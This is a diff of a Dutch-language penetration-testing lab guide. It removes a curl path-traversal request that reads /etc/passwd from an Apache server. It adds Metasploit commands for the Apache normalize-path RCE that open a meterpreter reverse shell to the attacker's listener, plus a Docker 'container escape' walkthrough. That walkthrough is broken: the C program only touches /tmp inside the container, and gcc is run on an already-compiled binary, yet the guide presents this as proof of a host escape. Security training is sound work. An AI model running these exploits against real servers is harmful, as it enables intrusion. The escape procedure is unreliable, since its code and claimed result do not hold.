@@ -12,22 +12,6 @@ PING 192.168.0.254 (192.168.0.254) 56(84) bytes of data.
 64 bytes from 192.168.0.254: icmp_seq=3 ttl=64 time=0.423 ms
 ```
 
-Stap 2: Controleer of de Apache HTTP server draait op de server
-
-Surf van de Kallio VM naar de Apache HTTP server VM en controleer of de server draait. Dit kan gedaan worden door in de browser het IP adres van de server in te voeren. Als de server draait, zou je een welkomstpagina moeten zien.
-
-![Site zichtbaar](img/cybersecuritysite.png)
-
-Stap 3: Path Traversal aanval uitvoeren
-
-Gebruik de volgende curl command om de path traversal aanval uit te voeren:
-
-```bash
-curl -v --path-as-is http://192.168.0.145:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
-```
-
-Als je deze command uitvoert, zou je de inhoud van het bestand /etc/passwd moeten zien. Dit bestand bevat informatie over de gebruikers op het systeem.
-
 Metasploitable gebruiken:
 
 ```bash
@@ -36,19 +20,92 @@ msfconsole
 
 ```bash
 use exploit/multi/http/apache_normalize_path_rce
-```
-
-```bash
-set RHOSTS 192.168.0.134
-set RPORT 80
+show options
+set RHOSTS 192.168.0.159
+set RPORT 8080
+set TARGETURI /
 set SSL false
-set TARGETURI /cgi-bin
-set CVE CVE-2021-42013
+set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.0.251
 set LPORT 4444
-set PAYLOAD linux/x64/meterpreter/reverse_tcp
+
+```
+
+Start de netcat listener op de kali machine:
+
+```bash
+nc -lvnp 4444
 ```
 
 ```bash
 run
 ```
+
+tap 1: Verbind met de Docker-container
+
+Voordat je de exploit uitvoert, moet je een manier hebben om de kwetsbare container aan te vallen. Als je Kali en de Ubuntu-machine op hetzelfde netwerk hebt, kun je verbinding maken met de Docker-container via de docker exec of docker attach opdracht. Maar als je de container vanuit Kali wilt aanvallen, kun je ook de netwerkpoort van de container gebruiken, afhankelijk van hoe de container is ingesteld.
+Stap 2: PoC-exploit Voorbereiden (Docker container escape)
+
+We gaan een simple local exploit uitvoeren door een programma op de kwetsbare container te compilen en het aanroepen vanaf Kali.
+Maak een simpele exploit in Kali:
+
+    Maak een exploitbestand aan, bijvoorbeeld docker_poc_exploit.c:
+
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+    // De exploit voert een system-aanroep uit om een bestand aan te maken op de host
+    system("touch /tmp/exploit_from_kali");
+    return 0;
+}
+
+    Compileer de exploit op je Kali-systeem:
+
+gcc docker_poc_exploit.c -o docker_poc_exploit
+
+    Verbind met de kwetsbare Docker-container en voer de exploit uit:
+
+        Hier gaan we ervan uit dat je container met verhoogde rechten draait op je Ubuntu-systeem (zoals geïnstalleerd in het script).
+
+        Verbind via docker exec of docker attach:
+
+    docker exec -it vulnerable-container bash
+
+    Binnen de container, ga je de exploit uitvoeren door de exploit te kopiëren en te compileren binnen de container:
+
+# Kopieer de exploit naar de container
+docker cp docker_poc_exploit vulnerable-container:/tmp/docker_poc_exploit
+
+# Log in in de container
+docker exec -it vulnerable-container bash
+
+# Compileer de exploit binnen de container
+gcc /tmp/docker_poc_exploit -o /tmp/exploit
+
+# Voer de exploit uit
+/tmp/exploit
+
+Stap 3: Controleer of de exploit succesvol is
+
+Als de exploit succesvol is, zou je een bestand moeten zien verschijnen op je host systeem (bijv. /tmp/exploit_from_kali). Dit toont aan dat de container-escape gelukt is.
+
+Controleer het bestand op de host:
+
+ls /tmp/exploit_from_kali
+
+Als je het bestand ziet, is de exploit succesvol uitgevoerd en is de container geëscaleerd naar de host.
+Stap 4: Verwijder de kwetsbare container
+
+Na het uitvoeren van de test kun je de kwetsbare container verwijderen om ervoor te zorgen dat deze geen schade aanricht aan je systeem:
+
+docker rm -f vulnerable-container
+
+Samenvatting van de procedure
+
+    Maak de exploit op Kali en voer deze uit binnen de kwetsbare Docker-container.
+
+    De exploit probeert een bestand te creëren op de host-systeem, wat aantoont dat de kwetsbare container succesvol is ontsnapt naar het host-systeem.
+
+    Zorg ervoor dat je alle containers verwijdert nadat je de test hebt uitgevoerd om geen onbedoelde gevolgen te ondervinden.
+
+Let op: Deze aanval wordt alleen uitgevoerd in een gecontroleerde testomgeving en moet niet worden gebruikt in productieomgevingen, aangezien dit kan leiden tot ernstige beveiligingsrisico’s.
